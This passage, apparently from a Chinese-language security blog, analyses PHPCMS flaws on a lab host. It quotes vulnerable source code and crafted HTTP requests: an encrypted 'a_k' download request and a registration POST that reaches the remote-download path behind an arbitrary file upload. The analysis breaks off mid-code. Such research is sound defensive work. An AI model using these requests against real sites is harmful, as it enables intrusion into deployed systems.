</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=q129buklbv2pojhu3fkfm4j0r4; XDEBUG_SESSION=XDEBUG_ECLIPSE; gYvca_att_json=asdf
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">userid_flash=e5a3qbTrR_cuRH_bUNu77w77DaTEdUSfzpOJXmUqs-7F
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>730a-gH-hHP4GIszpc6Gf5OdQ2s8t8gb7dvK75XVlVpRLZXZJRyIpwS75QKFKFQdZWHR2xplUIVF9GrDL1PwCV25pcjljgKgO2MqbU7EcZYCaoSckKOjCSZE2Dp7a6xNNaNwmqnE9cN9Z4MBrCKJWtuXzytoEJ91_TRSkxbznvcm8VTU2LcMFTqoKdNNsCS5yWFFUMvd7Y5CGqtV4PVoN9jJ</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046457.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046457.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046457.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046457.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046457.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046457.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /index.php?m=content&amp;c=down&amp;a=init&amp;aid=1&amp;a_k=730a-gH-hHP4GIszpc6Gf5OdQ2s8t8gb7dvK75XVlVpRLZXZJRyIpwS75QKFKFQdZWHR2xplUIVF9GrDL1PwCV25pcjljgKgO2MqbU7EcZYCaoSckKOjCSZE2Dp7a6xNNaNwmqnE9cN9Z4MBrCKJWtuXzytoEJ91_TRSkxbznvcm8VTU2LcMFTqoKdNNsCS5yWFFUMvd7Y5CGqtV4PVoN9jJ HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 192.168.241.130:8080
</span></span><span class="line"><span class="cl">Pragma: no-cache
</span></span><span class="line"><span class="cl">Cache-Control: no-cache
</span></span><span class="line"><span class="cl">DNT: 1
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=q129buklbv2pojhu3fkfm4j0r4; XDEBUG_SESSION=XDEBUG_ECLIPSE
</span></span><span class="line"><span class="cl">Connection: close
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png" /></p>
<h2 id="phpcmsmodulesmemberindexphp存在任意文件上传漏洞">phpcms/modules/member/index.php存在任意文件上传漏洞</h2>
<p>在<code>register</code>函数中有以下功能</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$member_setting</span><span class="p">[</span><span class="s1">&#39;choosemodel&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">require_once</span> <span class="nx">CACHE_MODEL_PATH</span> <span class="o">.</span> <span class="s1">&#39;member_input.class.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">require_once</span> <span class="nx">CACHE_MODEL_PATH</span> <span class="o">.</span> <span class="s1">&#39;member_update.class.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$member_input</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">member_input</span><span class="p">(</span><span class="nv">$userinfo</span><span class="p">[</span><span class="s1">&#39;modelid&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;info&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">array_map</span><span class="p">(</span><span class="s1">&#39;new_html_special_chars&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;info&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_model_info</span> <span class="o">=</span> <span class="nv">$member_input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;info&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>到达这一功能点需要构造数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.241.130:8080/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POST: dosubmit=1&amp;username=123&amp;nickname=123&amp;email=a@a.com&amp;password=123456&amp;modelid=123
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里首先对<code>member_update.class.php</code>和<code>member_input.class.php</code>进行包含,然后实例化了一个<code>member_input</code>类,然后调用了<code>member_input</code>类中的<code>get</code>方法</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png" /></p>
<p>注意这里选择的是<code>caches</code>目录下的<code>member_input.class.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span> <span class="o">=</span> <span class="nx">trim_script</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$model_cache</span> <span class="o">=</span> <span class="nx">getcache</span><span class="p">(</span><span class="s1">&#39;member_model&#39;</span><span class="p">,</span> <span class="s1">&#39;commons&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">table_name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db_pre</span> <span class="o">.</span> <span class="nv">$model_cache</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">modelid</span><span class="p">][</span><span class="s1">&#39;tablename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$debar_filed</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;catid&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;style&#39;</span><span class="p">,</span> <span class="s1">&#39;thumb&#39;</span><span class="p">,</span> <span class="s1">&#39;status&#39;</span><span class="p">,</span> <span class="s1">&#39;islink&#39;</span><span class="p">,</span> <span class="s1">&#39;description&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$field</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;islink&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$field</span><span class="p">,</span> <span class="nv">$debar_filed</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$field</span> <span class="o">=</span> <span class="nx">safe_replace</span><span class="p">(</span><span class="nv">$field</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$minlength</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;minlength&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$maxlength</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;maxlength&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$pattern</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;pattern&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$errortips</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;errortips&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$errortips</span><span class="p">))</span> <span class="nv">$errortips</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">$name</span><span class="s2"> 不符合要求！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$length</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$minlength</span> <span class="o">&amp;&amp;</span> <span class="nv">$length</span> <span class="o">&lt;</span> <span class="nv">$minlength</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$isimport</span><span class="p">)</span> <span class="nx">showmessage</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$name</span><span class="s2"> 不得少于 </span><span class="si">$minlength</span><span class="s2"> 个字符！&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$field</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">))</span> <span class="nx">showmessage</span><span class="p">(</span><span class="s1">&#39;模型中不存在&#39;</span> <span class="o">.</span> <span class="nv">$field</span> <span class="o">.</span> <span class="s1">&#39;字段&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$maxlength</span> <span class="o">&amp;&amp;</span> <span class="nv">$length</span> <span class="o">&gt;</span> <span class="nv">$maxlength</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$isimport</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">showmessage</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$name</span><span class="s2"> 不得超过 </span><span class="si">$maxlength</span><span class="s2"> 个字符！&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">str_cut</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$maxlength</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$pattern</span> <span class="o">&amp;&amp;</span> <span class="nv">$length</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$isimport</span><span class="p">)</span> <span class="nx">showmessage</span><span class="p">(</span><span class="nv">$errortips</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;isunique&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_one</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$field</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">),</span> <span class="nv">$field</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ROUTE_A</span> <span class="o">!=</span> <span class="s1">&#39;edit&#39;</span><span class="p">)</span> <span class="nx">showmessage</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$name</span><span class="s2"> 的值不得重复！&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$func</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;formtype&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$func</span><span class="p">))</span> <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">(</span><span class="nv">$field</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$info</span><span class="p">[</span><span class="nv">$field</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意到最后存在这样的语句<code>if (method_exists($this, $func)) $value = $this-&gt;$func($field, $value);</code>,说明可以通过get方法去调用这个类中的所有方法</p>
<p>而<code>$func</code>来源于<code>$this-&gt;fields[$field]['formtype']</code>,同时在<code>editor</code>方法中调用了<code>attachment::download</code>,可能可以将远程服务器上的文件下载到本地</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">editor</span><span class="p">(</span><span class="nv">$field</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$setting</span> <span class="o">=</span> <span class="nx">string2array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fields</span><span class="p">[</span><span class="nv">$field</span><span class="p">][</span><span class="s1">&#39;setting&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$enablesaveimage</span> <span class="o">=</span> <span class="nv">$setting</span><span class="p">[</span><span class="s1">&#39;enablesaveimage&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$site_setting</span> <span class="o">=</span> <span class="nx">string2array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">site_config</span><span class="p">[</span><span class="s1">&#39;setting&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$watermark_enable</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$site_setting</span><span class="p">[</span><span class="s1">&#39;watermark_enable&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">attachment</span><span class="o">-&gt;</span><span class="na">download</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$watermark_enable</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因此在这里构造的payload要满足以下几点</p>
<ol>
<li>
<p><code>$data</code>必须是<code>array</code>类型,因此<code>$_POST['info']</code>必须是<code>array</code>类型</p>
</li>
<li>
<p><code>$this-&gt;fields[$field]['formtype']==editor</code>而在<code>caches/caches_model/caches_data/model_field_1.cache.php</code>,说明<code>$field</code>必须等于<code>content</code></p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="s1">&#39;content&#39;</span> <span class="o">=&gt;</span> 
</span></span><span class="line"><span class="cl">  <span class="k">array</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;fieldid&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;8&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;modelid&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;siteid&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;field&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;content&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;内容&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;errortips&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;内容不能为空&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;formtype&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;editor&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="err">&#39;</span><span class="p">,</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>注意存在<code>$field = safe_replace($field);</code>,可能需要对其进行绕过</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.241.130:8080/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POST: dosubmit=1&amp;username=123&amp;nickname=123&amp;email=a@a.com&amp;password=123456&amp;modelid=1&amp;info[content]=valuexxxx
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>phpcms/libs/classes/attachment.class.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 附件下载
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Enter description here ...
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param $field 预留字段
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param $value 传入下载内容
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param $watermark 是否加入水印
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param $ext 下载扩展名
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param $absurl 绝对路径
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param $basehref 
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">download</span><span class="p">(</span><span class="nv">$field</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$watermark</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="s1">&#39;gif|jpg|jpeg|bmp|png&#39;</span><span class="p">,</span> <span class="nv">$absurl</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$basehref</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$image_d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">att_db</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_model</span><span class="p">(</span><span class="s1">&#39;attachment_model&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$upload_url</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;upload_url&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">field</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dir</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Y/md/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uploadpath</span> <span class="o">=</span> <span class="nv">$upload_url</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">upload_root</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">new_stripslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match_all</span><span class="p">(</span><span class="s2">&#34;/(href|src)=([</span><span class="se">\&#34;</span><span class="s2">|&#39;]?)([^ </span><span class="se">\&#34;</span><span class="s2">&#39;&gt;]+\.(</span><span class="si">$ext</span><span class="s2">))</span><span class="se">\\</span><span class="s2">2/i&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$remotefileurls</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
